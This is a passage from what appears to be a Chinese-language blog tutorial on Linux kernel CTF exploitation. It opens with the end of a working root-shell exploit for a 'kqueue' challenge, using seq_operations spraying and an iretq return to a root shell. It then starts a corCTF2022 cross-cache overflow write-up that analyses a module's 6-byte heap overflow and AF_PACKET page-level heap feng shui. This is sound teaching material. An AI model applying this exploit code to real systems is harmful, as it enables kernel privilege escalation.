class="hljs-string">&quot;mov r12, r14;&quot;</span><br>        <span class="hljs-string">&quot;add r12, 0x8c140;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, 0;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, middle_rsp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14, root_shell;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br>        );<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    saveStatus();<br><br>    middle_rsp = user_sp + <span class="hljs-number">0x8</span>;<br>    root_shell = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-type">int</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    info_log(<span class="hljs-string">&quot;Step I:Create a queue without any queue_entry :)&quot;</span>);<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);<br>    create_kqueue(<span class="hljs-number">0xffffffff</span>, <span class="hljs-number">0x20</span>*<span class="hljs-number">8</span>);      <span class="hljs-comment">//the queue-&gt;data include many shellcode ad</span><br>    <br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i++)&#123;<br>        data[i] = (<span class="hljs-type">size_t</span>)shellcode;<br>    &#125;<br>    edit_kqueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (<span class="hljs-type">char</span> *)data);<br>    info_log(<span class="hljs-string">&quot;Step II:Spraying the seq_operations!&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)&#123;<br>        seq_fd[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the get shell addr is :0x%lx\n&quot;</span>, (<span class="hljs-type">size_t</span>)get_root_shell);<br>    info_log(<span class="hljs-string">&quot;Step III:Overwrite 0x20 bytes...&quot;</span>);<br>    save_kqueue(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i= <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x200</span>; i++)&#123;<br>        read(seq_fd[i], data, <span class="hljs-number">0x8</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h1 id="八、Kernel-Heap-Cross-Cache-Overflow"><a href="#八、Kernel-Heap-Cross-Cache-Overflow" class="headerlink" title="八、Kernel Heap - Cross Cache Overflow"></a>八、Kernel Heap - Cross Cache Overflow</h1><h2 id="例题：corCTF2022-cache-of-castways"><a href="#例题：corCTF2022-cache-of-castways" class="headerlink" title="例题：corCTF2022-cache of castways"></a>例题：corCTF2022-cache of castways</h2><p>题目首先给出README，我们来康康，BitsByWill师傅给出了这样一段提示：</p>
<blockquote>
<p>After repeated attacks on poor kernel objects, I’ve decided to place pwners in a special isolated place - a marooned region of memory. Good luck escaping out of here :^) </p>
</blockquote>
<p>意思很明显，内核大师已经不满足于通用object的漏洞利用，直接告诉我们需要在一个隔离的环境完成利用，害怕 :^(</p>
<h3 id="1-题目逆向-5"><a href="#1-题目逆向-5" class="headerlink" title="1. 题目逆向"></a>1. 题目逆向</h3><p><a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">官方wp</a>中已经给出了完整的源码，我们就不需要模拟当时比赛的情景，直接聚焦于漏洞的利用当中，这里感谢BitsByWill师傅在题目当中同时提供了内核config和带有调试符号的内核映像，这为之后的学习省去了很多不必要的麻烦</p>
<p>首先查看启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>exec qemu-system-x86_64 \<br>    -m 4096M \<br>    -nographic \<br>    -kernel bzImage \<br>    -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on&quot; \<br>    -netdev user,id=net \<br>    -device e1000,netdev=net \<br>    -no-reboot \<br>    -monitor /dev/null \<br>    -cpu qemu64,+smep,+smap \<br>    -initrd initramfs.cpio.gz \                                          <br><br></code></pre></td></tr></table></figure>

<p>4G的内存，同时开启了smep、smap、kpti</p>
<p>实际上没必要查看，因为肯定保护全开orz</p>
<p>然后就是文件系统的初始化脚本，发现其中插入了我们需要分析的漏洞模块 <code>cache_of_castway.ko</code></p>
<p>启动！我朝好帅</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/ac345982b2b7d0a2bbfd42ae8def76094b369ac9.jpg" srcset="/img/loading.gif" lazyload></p>
<h4 id="init-castaway-driver"><a href="#init-castaway-driver" class="headerlink" title="init_castaway_driver"></a>init_castaway_driver</h4><p>首先来看init函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW_SZ 0x6</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNK_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX 8 * 50</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">castaway_cache</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> buf[CHUNK_SIZE];<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">init_castaway_driver</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    castaway_dev.minor = MISC_DYNAMIC_MINOR;<br>    castaway_dev.name = DEVICE_NAME;<br>    castaway_dev.fops = &amp;castaway_fops;<br>    castaway_dev.mode = <span class="hljs-number">0644</span>;<br>    mutex_init(&amp;castaway_lock);<br>    <span class="hljs-keyword">if</span> (misc_register(&amp;castaway_dev))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    castaway_arr = kzalloc(MAX * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">castaway_t</span> *), GFP_KERNEL); 		<span class="hljs-comment">//400个 castaway_t大小的数组</span><br>    <span class="hljs-keyword">if</span> (!castaway_arr)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    castaway_cachep = KMEM_CACHE(castaway_cache, SLAB_PANIC | SLAB_ACCOUNT); 	<span class="hljs-comment">//出题者自行构造的隔离kmem_cache</span><br>    <span class="hljs-keyword">if</span> (!castaway_cachep)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    printk(KERN_INFO <span class="hljs-string">&quot;All alone in an castaway cache... \n&quot;</span>);<br>    printk(KERN_INFO <span class="hljs-string">&quot;There&#x27;s no way a pwner can escape!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中 <code>KMEM_CACHE</code>是一个创建 <code>kmem_cache</code>的宏，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Please use this macro to create slab caches. Simply specify the</span><br><span class="hljs-comment"> * name of the structure and maybe some flags that are listed above.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The alignment of the struct determines object alignment. If you</span><br><span class="hljs-comment"> * f.e. add ____cacheline_aligned_in_smp to the struct declaration</span><br><span class="hljs-comment"> * then the objects will be properly aligned in SMP configurations.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KMEM_CACHE(__struct, __flags)					\</span><br><span class="hljs-meta">		kmem_cache_create(#__struct, sizeof(struct __struct),	\</span><br><span class="hljs-meta">			__alignof__(struct __struct), (__flags), NULL)</span><br></code></pre></td></tr></table></figure>

<p>该 <code>kmem_cache</code>的object大小为512字节，可以注意到创建 <code>kmem_cache</code>时带有 <code>SLAB_ACCOUNT|SLAB_PANIC</code>这个flag，我们查看内核地的配置发现 <code>CONFIG_MEMCG_KMEM=y</code>，因此通过该 <code>kmem_cache</code>创建的slab将会被归于一个单独的slab池当中，从而造成一个完全隔离的环境，而这里为了凸显这个 “完全”，同样的内核配置中 <code>CONFIG_SLAB_MERGE_DEFUALT</code>选项被禁止，以防通过使用 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/latest/source/mm/slab_common.c#L186"><code>find_mergeable</code>函数</a> 来复用同样类似的标志以及大小的 <code>kmem_cache</code></p>
<h4 id="castaway-ioctl"><a href="#castaway-ioctl" class="headerlink" title="castaway_ioctl"></a>castaway_ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int64_t</span> idx;<br>    <span class="hljs-type">uint64_t</span> size;<br>    <span class="hljs-type">char</span> *buf;    <br>&#125;<span class="hljs-type">user_req_t</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">castaway_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>    <span class="hljs-type">user_req_t</span> req;<br>    <span class="hljs-type">long</span> ret = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (cmd != ALLOC &amp;&amp; copy_from_user(&amp;req, (<span class="hljs-type">void</span> *)arg, <span class="hljs-keyword">sizeof</span>(req)))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    mutex_lock(&amp;castaway_lock);<br>    <span class="hljs-keyword">switch</span> (cmd)<br>    &#123;<br>        <span class="hljs-keyword">case</span> ALLOC:<br>            ret = castaway_add();<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> EDIT:<br>            ret = castaway_edit(req.idx, req.size, req.buf);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            ret = <span class="hljs-number">-1</span>;<br>    &#125;<br>    mutex_unlock(&amp;castaway_lock);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>给出了用户传参规则，ioctl实现了两种功能，下一个</p>
<h4 id="castaway-add"><a href="#castaway-add" class="headerlink" title="castaway_add"></a>castaway_add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">castaway_add</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx;<br>    <span class="hljs-keyword">if</span> (castaway_ctr &gt;= MAX)<br>    &#123;<br>        <span class="hljs-keyword">goto</span> failure_add;<br>    &#125;<br>    idx = castaway_ctr++;<br>    castaway_arr[idx] = kmem_cache_zalloc(castaway_cachep, GFP_KERNEL_ACCOUNT);<br><br>    <span class="hljs-keyword">if</span> (!castaway_arr[idx])<br>    &#123;<br>        <span class="hljs-keyword">goto</span> failure_add;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> idx;<br><br>    failure_add:<br>    printk(KERN_INFO <span class="hljs-string">&quot;castaway chunk allocation failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>通过自带的 <code>kmem_cache</code>来分配一个obj，然后将其地址给到全局的object数组当中</p>
<h4 id="castaway-edit"><a href="#castaway-edit" class="headerlink" title="castaway_edit"></a>castaway_edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> pad[OVERFLOW_SZ];<br>    <span class="hljs-type">char</span> buf[];<br>&#125;<span class="hljs-type">castaway_t</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">castaway_edit</span><span class="hljs-params">(<span class="hljs-type">int64_t</span> idx, <span class="hljs-type">uint64_t</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp[CHUNK_SIZE];<br>    <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= MAX || !castaway_arr[idx])<br>    &#123;<br>        <span class="hljs-keyword">goto</span> edit_fail;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (size &gt; CHUNK_SIZE || copy_from_user(temp, buf, size))<br>    &#123;<br>        <span class="hljs-keyword">goto</span> edit_fail;<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(castaway_arr[idx]-&gt;buf, temp, size);<br><br>    <span class="hljs-keyword">return</span> size;<br><br>    edit_fail:<br>    printk(KERN_INFO <span class="hljs-string">&quot;castaway chunk editing failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我们每次调用 <code>memcpy</code>都是从object的第6字节才开始拷贝一整个块的数据，因此存在6字节的溢出</p>
<p>再次查看配置，其中也开启了下面这两个好伙伴</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_SLAB_FREELIST_RANDOM</span>=y    <br><span class="hljs-attr">CONFIG_SLAB_FREELIST_HARDENED</span>=y<br></code></pre></td></tr></table></figure>

<h3 id="2-利用思路"><a href="#2-利用思路" class="headerlink" title="2.利用思路"></a>2.利用思路</h3><p>按照出题人所说，题目在基本上内核保护全开的情况下，漏洞模块中的 <code>kmem_cache</code>存在隔离且无法复用，并且内容当中不存在任何指针，<code>free_object</code>的 <code>freelist</code>指针也并不在开头而是被放在了中间，给到我们的条件就仅仅只有一个六字节的溢出，似乎已经到了绝境，但是是否有一种方法来打破这层囚笼呢？</p>
<p>事实上确实存在这一手法，既然说我们分配的 <code>object</code>已经隔离了起来，不可能利用不同 <code>kmem_cache</code>之间的 <code>object</code>来实现利用，但是继续往底层考量，我们要知道Linux内核分配，在slub算法之前还存在一个算法，那就是伙伴系统（Buddy System），一切以页为单位的分配均是从他这儿来分配，当然我们的 <code>kmem_cache</code>也不例外，如果我们能进行恰当的布局，就可以使得不同的 <code>kmem_cache</code>相邻，此时我们就可能造成隔离 <code>kmem_cache</code>之间object的溢出！</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/cc11728b4710b912c72ab0cd85fdfc039245221d.jpg" srcset="/img/loading.gif" lazyload></p>
<p>上图就是其中大致的场景，如果我们的<code>vulnerable kmem_cache</code>同其他通用 <code>kmem_cache</code>出现隔离，我们仍能利用buddy system分配连续块的特性来造成不同结构间的溢出,关于该技巧的细节，可以通过阅读下面博客进行理解</p>
<p><a target="_blank" rel="noopener" href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game">AUTOSLAB应对跨缓存利用的措施</a></p>
<p><a target="_blank" rel="noopener" href="https://etenal.me/archives/1825">CVE-2022-27666 Page-Level heap fengshui</a></p>
<p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">Google project zero CVE-2017-7308</a></p>
<p>事实上BitsByWill师傅也推荐了该博客</p>
<p><img src="https://grsecurity.net/img/cross_cache_overflow.png" srcset="/img/loading.gif" lazyload></p>
<p>这里直观上来看就好像是将我们平时用到的object提升了一个量级，变成了slab了</p>
<p>当一个slab页面被释放给伙伴系统时，考虑到该内存页面应该被内核回收，它将在稍后的某个时刻被重用。 <code>cross_cache_overlapping</code> 的技术是释放slab页中的所有 <code>memory slot</code>，或者叫做我们平时讨论的 <code>object</code>  ，强制释放slab页。 然后，喷射另一种类型的对象来分配新的slab页面，以回收释放的slab页面。 如果攻击成功，释放的对象的内存将被另一种类型的对象占用。 过去，利用Linux内核内存安全漏洞进行跨缓存攻击的做法并不多见。 在通用缓存中这样做不仅没有必要，而且不稳定。 特别是对于经常使用的通用缓存，攻击会遭受分配不可控带来的噪音,也就是在分配过程中可能分配多种不同类型的结构体。 例如，当内核进行未知分配时，slab 页中所有 <code>memory slot</code> 的释放都会失败，从而导致无法通过另一个slab 页回收该slab 页。 与在通用缓存上执行交叉缓存相比，在专用对象缓存上几乎没有噪音。 这是因为每个分配都会进入自己的缓存，包括来自内核的未知分配，这减少了缓存中未知分配的可能性。 这样，攻击者就可以可靠地释放专用缓存的slab页面来执行跨缓存攻击。</p>
<p>这么说来，这个专用缓存对象对我们来说，既是挑战，也是馈赠~</p>
<p>既然我们准备使用跨缓存对象进行溢出，我们就首先需要堆喷我们的 <code>vulnerable object</code>，同时我们也要堆喷 <code>victim object</code>，并且我们要保证 <code>victim object</code>所位于的 <code>slab</code>要恰好位于 <code>vulnerable object</code>的下方</p>
<p>我们如何来达成上述条件呢，那就需要使用到 <code>Page-Level heap fengshui</code>,也就是页级堆风水</p>
<h3 id="3-页级分配原语"><a href="#3-页级分配原语" class="headerlink" title="3.页级分配原语"></a>3.页级分配原语</h3><p>该节参考 <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">Google Project zero writeup</a></p>
<h4 id="AF-PACKET-sockets基础知识"><a href="#AF-PACKET-sockets基础知识" class="headerlink" title="AF_PACKET sockets基础知识"></a><code>AF_PACKET sockets</code>基础知识</h4><p>首先就是对于 <code>AF_PACKET sockets</code>的基本解释</p>
<p><code>AF_PACKET seckets</code> 允许用户在设备驱动程序级别发送或接收数据包,要创建 <code>AF_PACKET sockets</code>，进程必须在管理其网络命名空间的用户命名空间中具有 <code>CAP_NET_RAW</code> 功能。 应该注意的是，如果内核启用了非特权用户命名空间，那么非特权用户就能够创建数据包套接字。</p>
<p>他在大众的认知下往往被常用于 <code>tcpdump</code>对于网络接口包的嗅探，google团队也给出了一个例子，是利用strace来跟踪后面指令使用到的系统调用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">strace tcpdump -i eth0</span><br>...<br>socket(PF_PACKET, SOCK_RAW, 768)        = 3<br>...<br>bind(3, &#123;sa_family=AF_PACKET, proto=0x03, if2, pkttype=PACKET_HOST, addr(0)=&#123;0, &#125;, 20) = 0<br>...<br>setsockopt(3, SOL_PACKET, PACKET_VERSION, [1], 4) = 0<br>...<br>setsockopt(3, SOL_PACKET, PACKET_RX_RING, &#123;block_size=131072, block_nr=31, frame_size=65616, frame_nr=31&#125;, 16) = 0<br>...<br>mmap(NULL, 4063232, PROT_READ|PROT_WRITE, MAP_SHARED, 3, 0) = 0x7f73a6817000<br>...<br></code></pre></td></tr></table></figure>

<p>这里不放我自己虚拟机的情况是因为我的eth0没怎么经常收发包（bushi</p>
<p>之后也给出利用的具体步骤</p>
<ol>
<li>首先创建出一个<code>socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))</code></li>
<li>将该 <code>socket</code>绑定在eth0接口</li>
<li>环形缓冲区版本通过 <code>socket option:PACKET_VERSION</code>来设置为 <code>TPACKET_V2</code></li>
<li>使用 <code>socket option:PACKET_RX_RING</code> 来创建该环形缓冲区</li>
<li>将环形缓冲区映射在用户空间</li>
</ol>
<p>经过这一系列系统调用，linux内核将会把通过网络接口eth0的网络packet放入环形缓冲区，然后 <code>tcpdump</code> 再从该缓冲区在用户空间的映射来读取信息</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8sUz4Vc6b3HGdP_k6atb9ll9WozOxVz4A5Ph4_nSHew5-l6CpLGMZrnhYlV33JtUROTInR3kNi9caxvS6v6s-J9OVRKH3sI9XRiRlNCl3jXvDIqKzQ8tcmHVcU62QqTcB01Wg1m-CX2INOpoZqNWQgfA-67A5RFyKsOP59fA5W4iuASS2U56jhLCH/s640/ak01.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="AF-PACKET-sockets内核体现"><a href="#AF-PACKET-sockets内核体现" class="headerlink" title="AF_PACKET sockets内核体现"></a><code>AF_PACKET sockets</code>内核体现</h4><p>首先当我们创建一个 <code>AF_PACKET socket</code>的时候，会在内核创建下述结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_sock</span> &#123;</span><br>	<span class="hljs-comment">/* struct sock has to be the first member of packet_sock */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span>		<span class="hljs-title">sk</span>;</span><br>	<br>	...<br>	<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span>	<span class="hljs-title">rx_ring</span>;</span> 		<span class="hljs-comment">//通过setsocketopt选项PACKET_RX_RING(recive)来创建 </span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span>	<span class="hljs-title">tx_ring</span>;</span> 		<span class="hljs-comment">//通过setcosketopt选项PACKET_TX_RING(transmit)来创建</span><br>	<br>	...<br>	<br>	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span>	<span class="hljs-title">tp_version</span>;</span> 		<span class="hljs-comment">//用来设置环形缓冲区版本</span><br>	<br>	...<br>	<br>	<span class="hljs-type">int</span>			(*xmit)(<span class="hljs-keyword">struct</span> sk_buff *skb);<br>	<br>	...<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>下面是对于环形缓冲区数据结构体 <code>struct packet_ring_buffer</code>的解释</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> &#123;</span><br>	<span class="hljs-type">char</span> *buffer;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">packet_ring_buffer</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span>		*<span class="hljs-title">pg_vec</span>;</span><br><br>	...<br><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>			*rx_owner_map;<br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_kbdq_core</span>	<span class="hljs-title">prb_bdqc</span>;</span><br>	&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>这里我们的 <code>pg_vec</code>字段是一个指向 <code>struct pgv</code>结构体的指针，然后每一个 <code>struct pgv</code>结构体都包含着一个指向某个 <code>block</code>的指针，如下google团队图</p>
<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7Smv0slKCCmVb3uAnY2vJ07NaaBscV0ZKY8-RD3ysJz9DY4YQOvMlkP7L9v66r8NwXKdypSOhWSuFstZvXIC6vhs0CZzFI2fgX6htfvs6aZrAwZrwV1HOgX-2eNWf3s6im3zcSmqMe3eaIOyNdBoP4VBRVpaefbxHAwaWeRywW9szC2rxqjuEJEED/s544/ak03.png" srcset="/img/loading.gif" lazyload></p>
<p>下面我们来看环形缓冲区其中的 <code>prb_bdqc</code>字段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* kbdq - 内核块描述队列 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_kbdq_core</span> &#123;</span><br>	<br>	...<br>	<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">short</span>	blk_sizeof_priv; 	